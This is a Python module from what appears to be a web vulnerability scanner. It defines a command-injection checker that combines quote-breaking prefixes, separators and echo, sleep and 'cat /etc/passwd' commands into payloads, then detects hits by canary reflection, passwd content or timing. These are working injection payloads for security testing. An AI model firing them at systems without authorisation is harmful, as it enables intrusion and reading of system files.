"""Command Injection checker — multi-OS prefix/suffix combinator with echo + time detection."""

import re
from typing import Optional, List

import httpx

from webscanner.checkers.base import BaseChecker
from webscanner.core.models import CheckResult, BaselineData


class CMDi(BaseChecker):

    name = "Command Injection"

    def __init__(self, sleep_s: int = 5, time_margin: float = 2.0):
        self.sleep_s = sleep_s
        self.time_margin = time_margin
        self.canary = self.rand(10)

        self.payloads_list = self._build_payloads()
        self._canary_rx = re.compile(re.escape(self.canary))

    def _build_payloads(self) -> List[str]:
        """Build CMDi payloads using prefix × separator × command combinator."""
        c = self.canary
        s = self.sleep_s
        out: list[str] = []

        # ── Closing prefixes (break out of quotes/context) ──
        prefixes = ["", "'", '"', ")", "$(", "`"]

        # ── Separators (chain commands) ──
        separators = [";", "|", "||", "&&", "\n", "%0a"]

        # ── Unix echo commands (output-based detection) ──
        unix_echo = [
            f"echo {c}",
            f"printf {c}",
            f"echo {c} #",
            f"cat /etc/passwd",  # signature file
        ]

        # ── Unix sleep commands (time-based detection) ──
        unix_sleep = [
            f"sleep {s}",
            f"ping -c {s} 127.0.0.1",
        ]

        # ── Windows echo commands ──
        win_echo = [f"echo {c}"]

        # ── Windows sleep commands ──
        win_sleep = [
            f"timeout /T {s}",
            f"ping -n {s} 127.0.0.1 >NUL",
        ]

        # ── 1. Separator-based injection ──
        for prefix in prefixes:
            for sep in separators:
                for cmd in unix_echo:
                    out.append(f"{prefix}{sep}{cmd}")
                for cmd in unix_sleep:
                    out.append(f"{prefix}{sep}{cmd}")
                for cmd in win_echo:
                    out.append(f"{prefix}{sep}{cmd}")
                for cmd in win_sleep:
                    out.append(f"{prefix}{sep}{cmd}")

        # ── 2. Command substitution (backtick / $()) ──
        for cmd in unix_echo:
            out.append(f"`{cmd}`")
            out.append(f"$({cmd})")
        for cmd in unix_sleep:
            out.append(f"`{cmd}`")
            out.append(f"$({cmd})")

        # ── 3. Quoted prefix + substitution ──
        for q in ["'", '"']:
            for cmd in unix_echo:
                out.append(f"{q}`{cmd}`")
                out.append(f"{q}$({cmd})")
            for cmd in unix_sleep:
                out.append(f"{q}`{cmd}`")
                out.append(f"{q}$({cmd})")

        # Deduplicate preserving order
        seen = set()
        unique = []
        for p in out:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        return unique

    def get_payloads(self) -> List[str]:
        return self.payloads_list

    def check(self, baseline: BaselineData, response: httpx.Response, payload: str) -> Optional[CheckResult]:
        body = response.text or ""

        # ── 1. Echo-based (differential): canary NOT in baseline, YES in injected ──
        if self._canary_rx.search(body) and not self._canary_rx.search(baseline.body):
            return CheckResult(
                vuln_name=self.name,
                severity="critical",
                confidence="confirmed",
                location="", param="", payload=payload,
                status_code=response.status_code,
                evidence=f"Canary '{self.canary}' reflected in response",
            )

        # ── 2. /etc/passwd detection (differential) ──
        passwd_rx = re.compile(r"root:x:0:0:")
        if passwd_rx.search(body) and not passwd_rx.search(baseline.body):
            return CheckResult(
                vuln_name=self.name,
                severity="critical",
                confidence="confirmed",
                location="", param="", payload=payload,
                status_code=response.status_code,
                evidence="Command output: /etc/passwd content detected",
            )

        # ── 3. Time-based (differential) ──
        try:
            elapsed = response.elapsed.total_seconds()
            threshold = baseline.elapsed + self.sleep_s - self.time_margin
            if threshold > 0 and elapsed >= threshold:
                return CheckResult(
                    vuln_name=self.name,
                    severity="high",
                    confidence="tentative",
                    location="", param="", payload=payload,
                    status_code=response.status_code,
                    evidence=f"Time: baseline={baseline.elapsed:.2f}s, injected={elapsed:.2f}s",
                )
        except Exception:
            pass

        return None
